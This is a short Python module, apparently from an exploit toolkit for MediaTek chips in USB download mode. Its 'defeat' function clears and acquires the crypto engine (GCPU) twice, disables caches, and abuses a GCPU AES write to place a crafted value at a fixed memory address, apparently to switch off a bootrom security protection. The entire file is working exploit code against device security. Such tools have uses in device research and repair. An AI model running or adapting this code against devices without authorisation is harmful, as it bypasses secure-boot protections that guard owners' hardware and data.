from __future__ import annotations

from typing import TYPE_CHECKING

from firebreak.mediatek import gcpu

if TYPE_CHECKING:
    from firebreak.mediatek.usbdl import Bootrom

ADDRESS = 0x102868
DATA = bytes(12) + b"\x80" + bytes(3)


def defeat(*, bootrom: Bootrom) -> None:
    for _ in range(2):
        gcpu.clear(bootrom=bootrom)
        gcpu.acquire(bootrom=bootrom)
    bootrom.disable_caches()
    gcpu.aes_write(address=ADDRESS, bootrom=bootrom, data=DATA)
